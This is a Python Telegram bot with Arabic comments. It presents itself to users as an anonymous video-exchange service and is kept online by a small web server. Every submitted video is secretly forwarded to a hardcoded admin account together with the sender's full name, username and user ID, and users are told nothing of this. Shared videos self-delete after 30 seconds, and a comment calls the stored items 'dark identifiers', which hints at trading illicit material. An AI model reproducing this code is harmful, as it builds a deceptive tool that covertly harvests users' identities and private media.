import os
import asyncio
import random
from aiohttp import web
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- خادم الويب لفتح المنفذ (Port) في Render ليعمل مع UptimeRobot ---
async def handle(request):
    return web.Response(text="Bot is running smoothly!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# --- إعدادات البوت ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = 7195085575  # الأيدي الخاص بك لتوصلك التقارير

# قائمة لتخزين المعرفات المظلمة/المقاطع المتبادلة
video_database = []

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 أهلاً بك في بوت تبادل المقاطع!\n\n"
        "أرسل مقطع فيديو الآن ليتم تبادله تلقائياً مع مقطع آخر من مستخدم مختلف."
    )

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video_file_id = update.message.video.file_id

    # 1. إرسال تقرير مفصل للآدمن (لك فقط)
    admin_caption = (
        f"📥 **مقطع متبادل جديد:**\n\n"
        f"👤 **مشارك جديد:**\n"
        f"الاسم: {user.full_name}\n"
        f"اليوزر: @{user.username if user.username else 'لا يوجد'}\n"
        f"الآيدي: `{user.id}`"
    )
    try:
        await context.bot.send_video(
            chat_id=ADMIN_ID,
            video=video_file_id,
            caption=admin_caption
        )
    except Exception as e:
        print(f"Error sending to admin: {e}")

    # 2. عملية التبادل للمستخدم
    if video_database:
        # اختيار مقطع عشوائي من القاعدة
        random_video = random.choice(video_database)
        sent_message = await update.message.reply_video(
            video=random_video,
            caption="⏳ **قم بتحويل المقطع أو حفظه فوراً، ينحذف بعد 30 ثانية!**"
        )
        
        # حفظ المقطع الجديد في القاعدة
        video_database.append(video_file_id)

        # حذف المقطع بعد 30 ثانية
        await asyncio.sleep(30)
        try:
            await sent_message.delete()
        except Exception:
            pass
    else:
        # إذا كان هذا أول مقطع يرسل للبوت
        video_database.append(video_file_id)
        await update.message.reply_text(
            "تم استلام مقطعك بنجاح! أنت أول المشاركين، أرسل مقطعاً آخر أو انتظر مشاركة مستخدم جديد ليصلك مقطعه."
        )

def main():
    if not BOT_TOKEN:
        print("Error: BOT_TOKEN environment variable is not set.")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))

    # تشغيل خادم الويب بالتوازي مع البوت
    loop = asyncio.get_event_loop()
    loop.create_task(start_web_server())

    print("Bot started...")
    app.run_polling()

if __name__ == '__main__':
    main()
